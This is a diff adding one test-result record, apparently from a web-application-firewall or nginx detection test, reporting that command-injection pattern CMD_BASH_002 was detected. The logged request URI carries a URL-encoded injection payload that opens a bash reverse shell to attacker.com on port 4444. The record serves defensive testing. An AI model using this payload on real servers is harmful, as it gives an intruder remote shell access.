@@ -1,0 +1,5 @@
+Pattern ID: CMD_BASH_002
+        Status: passed
+        Latency: ~37000ms
+        Detection: 1 / 1
+        Rule: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1770995215928-f4bwr9 pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1
